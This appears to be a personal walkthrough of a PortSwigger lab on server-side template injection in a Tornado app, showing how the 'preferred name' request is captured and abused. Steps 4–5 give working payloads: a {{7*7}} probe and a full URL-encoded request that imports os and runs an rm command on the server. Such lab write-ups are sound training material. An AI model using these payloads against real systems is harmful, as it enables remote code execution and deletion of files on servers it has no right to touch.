
# #PortSwigger 


![[Pasted image 20251214092614.png]]


## Lab Description

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template.

**Objective:** Execute arbitrary code to delete the `morale.txt` file from Carlos's home directory.

**Credentials:** `wiener:peter`

**Hint:** Take a closer look at the "preferred name" functionality.

---
---


### Step 1: Log In and Post a Comment

1. Log in as `wiener:peter`
2. Post a comment on any blog post
3. This creates a comment that will display the author name

---

### Step 2: Explore the Preferred Name Functionality

1. Go to **My account**
2. Notice the option to select how your name is displayed:
    - Full name (`user.name`)
    - First name (`user.first_name`)
    - Nickname (`user.nickname`)
3. When you submit your choice, a `POST /my-account/change-blog-post-author-display` request is sent    

---

### Step 3: Capture the Request

1. In Burp Proxy, find the `POST /my-account/change-blog-post-author-display` request
2. Send it to Repeater

**Example request:**
```
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

blog-post-author-display=user.name
```

*`user.name`*
![[Pasted image 20251214093527.png]]

*`user.nickname`*
![[Pasted image 20251214093617.png]]


---

### Step 4: Escape the Expression Context

**Tornado template syntax:**
- `{{ someExpression }}` --> Evaluates and renders output
- `{% somePython %}` --> Executes Python code

**Test payload (escape context):**
```
blog-post-author-display=user.name}}{{7*7}}
```

**Reload the blog post containing your comment.**

![[Pasted image 20251214094104.png]]

**Result:** The name shows `Peter Wiener49}}` --> The `7*7` was evaluated!

Template injection confirmed.


---

### Step 5: Execute Python Code

**Tornado Python execution syntax:**
```
{% import os %}
{{ os.system('rm /home/carlos/morale.txt') }}
```

*Check what user*
![[Pasted image 20251214094834.png]]

*Check directory
![[Pasted image 20251214094857.png]]

*Delete morale.txt*
![[Pasted image 20251214094939.png]]


*Delete 'morle.txt'*
![[Pasted image 20251214095017.png]]


**Full request:**
```
POST /my-account/change-blog-post-author-display HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
```


---

### Step 6: Trigger the Payload

1. After sending the request, reload the blog post containing your comment
2. The Python code executes in the background
3. The file `/home/carlos/morale.txt` is deleted

---

### Step 7: Lab Solved

![[Pasted image 20251214095040.png]]


---
---
